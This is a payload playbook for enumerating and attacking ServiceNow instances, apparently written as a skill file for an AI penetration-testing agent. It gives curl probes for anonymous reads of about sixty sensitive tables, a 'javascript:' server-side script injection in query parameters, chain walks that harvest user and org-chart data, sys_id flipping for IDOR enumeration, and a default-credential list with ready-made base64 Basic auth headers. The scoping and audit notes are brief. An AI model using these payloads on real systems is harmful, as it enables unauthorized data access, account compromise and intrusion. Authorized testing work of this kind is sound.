# ServiceNow GlideRecord — Deep-Enum Payloads

> Source: Custom — compiled from ServiceNow REST API documentation and table-ACL research.

Use these payloads after `vendor-platform-enum/SKILL.md` triggers on a ServiceNow fingerprint. The REST API's `/api/now/v1/table/<table>` endpoint maps directly to the platform's GlideRecord access-control rules; one mis-set ACL or one over-broad role grant exposes adjacent tables, not just the one that triggered detection.

## Standard table probe list

Probe each table via `aith assess kali exec` so each request lands in the audit pipeline. A 200 with non-empty `result[]` is anonymous-readable; 401/403 with `User Not Authenticated` is the expected baseline.

```bash
aith assess kali exec --technique INFO-DISCLOSURE \
  --intent "ServiceNow table probe — sys_user anonymous-read test" \
  --probe-kind payload --phase recon --timeout 30 -- \
  curl -sS 'https://TARGET/api/now/v1/table/sys_user?sysparm_limit=1' \
    -H 'Accept: application/json'
```

Table list to probe (send the same probe shape for each):

```
sys_user, sys_user_group, sys_user_grmember, sys_user_role, sys_user_has_role,
sys_db_object, sys_dictionary, sys_choice, sys_properties, sys_security_acl,
sys_acl_role, sys_acl_operation, sys_user_preference, sys_audit, sys_history_set,
sys_history_line, sys_log, sys_log_transaction, sys_metadata, sys_update_xml,
incident, change_request, problem, task, sc_request, sc_req_item, sc_cat_item,
sc_category, kb_knowledge, kb_category, sysapproval_approver, sysapproval_group,
cmdb_ci, cmdb_ci_computer, cmdb_ci_server, cmdb_ci_appl, cmdb_ci_database,
cmdb_ci_business_app, cmdb_ci_service, cmdb_rel_ci, cmdb_metadata,
sys_attachment, sys_attachment_doc, sys_email, sys_email_outbound,
sysauto_script, sys_script, sys_script_include, sys_script_action,
sys_script_client, sys_processor, sys_ui_action, sys_ui_view,
sys_user_session, sys_user_login_history, sysauto_remind,
cmn_location, cmn_department, core_company, core_country
```

The `sys_db_object` table is the meta-table — when it returns 200 anonymously, the caller can enumerate every other table on the instance, which makes the IDOR-boundedness test trivially "systemic".

## Query DSL — `sysparm_query`

The `?sysparm_query=` parameter accepts encoded queries. Common shapes:

```
sysparm_query=active=true                                   # filter on field
sysparm_query=active=true^ORDERBYsys_created_on             # filter + order
sysparm_query=name!=admin                                   # not-equals
sysparm_query=user_nameSTARTSWITHadmin                      # string prefix
sysparm_query=email.endsWith=@example.test                  # related-field
sysparm_query=sys_created_on>=javascript:gs.daysAgo(7)      # GlideAjax injection vector
```

The `javascript:gs.<method>(...)` form is the high-value query — it executes server-side ScriptInclude code in the query context. When it returns 200 with results, the caller has read-only Glide script execution; when it returns 200 with results that match a different filter shape than the query specified, the caller has *write* access to a system property the script touched. Treat any non-trivial response to a `javascript:` query as an escalation candidate.

## `sysparm_display_value=true` chain-walk

By default, reference fields return Sys IDs (e.g., `"assigned_to": "62826bf03710200044e0bfc8bcbe5df1"`). The display-value variant resolves them to human-readable strings:

```
GET /api/now/v1/table/incident?sysparm_limit=10&sysparm_display_value=true&sysparm_exclude_reference_link=false
```

The response now includes both the Sys ID and the resolved name (`"assigned_to": {"link": "https://TARGET/api/now/v1/table/sys_user/62826bf...", "value": "62826bf...", "display_value": "Internal Admin User"}`). The `link` field is the hop target for the chain walk — issue the same probe against that URL to read the referenced row.

## Common reference-field walks

| Source table | Reference field | Target table |
|---|---|---|
| `incident` | `assigned_to`, `caller_id`, `opened_by`, `closed_by` | `sys_user` |
| `incident` | `assignment_group` | `sys_user_group` |
| `incident` | `cmdb_ci` | `cmdb_ci` (polymorphic) |
| `change_request` | `requested_by`, `assigned_to` | `sys_user` |
| `cmdb_ci_computer` | `assigned_to`, `managed_by` | `sys_user` |
| `cmdb_ci_computer` | `location` | `cmn_location` |
| `cmdb_ci_business_app` | `business_criticality`, `owned_by` | `sys_user`, picklist |
| `sc_request` | `requested_for`, `opened_by` | `sys_user` |
| `kb_knowledge` | `author`, `kb_category` | `sys_user`, `kb_category` |

Walking `incident.caller_id → sys_user → sys_user.manager → sys_user` is a 4-hop chain that exposes internal org-chart relationships.

## Bounded-vs-systemic IDOR test

Take one leaked `sys_id` (e.g., the `caller_id` from an incident). Flip the last character and read:

```
GET /api/now/v1/table/sys_user/<modified-sys-id>
```

- **Bounded** — adjacent Sys ID returns 401/403 or `Record not found`. The leak is the original incident plus its chain.
- **Systemic** — adjacent Sys ID returns 200 with a different user record. The whole `sys_user` table is anonymous-enumerable, severity escalates accordingly.

## Aggregate API probe

`GET /api/now/v1/stats/<table>?sysparm_count=true&sysparm_query=<filter>` returns row counts without exposing the rows. When the row API returns 401 but the stats API returns 200 with a non-zero count, the table contents are partially indexed — the count alone leaks how many users / how many incidents the tenant tracks, which is intelligence even when the row data is unreachable.

## Default credentials probe (operator-gated)

Only when the engagement scope explicitly permits credentialed testing, probe ServiceNow default-admin credentials. Run via `aith assess kali exec` with `--destructive` because a successful auth test establishes a session:

```bash
aith assess kali exec --technique AUTH \
  --intent "ServiceNow default-credential probe admin:admin" \
  --probe-kind payload --phase consume-test --timeout 30 --destructive -- \
  curl -sS 'https://TARGET/api/now/v1/table/sys_user?sysparm_limit=1' \
    -H 'Accept: application/json' \
    -H 'Authorization: Basic YWRtaW46YWRtaW4='
```

Default credential pairs to cycle through (`echo -n "user:pass" | base64` to encode each):

```
admin:admin       → YWRtaW46YWRtaW4=
admin:Password1   → YWRtaW46UGFzc3dvcmQx
admin:ChangeMe    → YWRtaW46Q2hhbmdlTWU=
itil:itil         → aXRpbDppdGls
```

A 200 with results is a separate finding from the anonymous-read finding (default-credentials, not no-auth).

## Rate-limit discipline

ServiceNow's REST API is rate-limited per-instance (default ceiling 10 RPS for unauthenticated reads). Default to 1 request / 500ms (2 RPS); drop to 1 request / 1500ms on the first 429 or `Retry-After`. The platform's audit log records every REST request — assume the dispatch is observed and budget the request count accordingly.
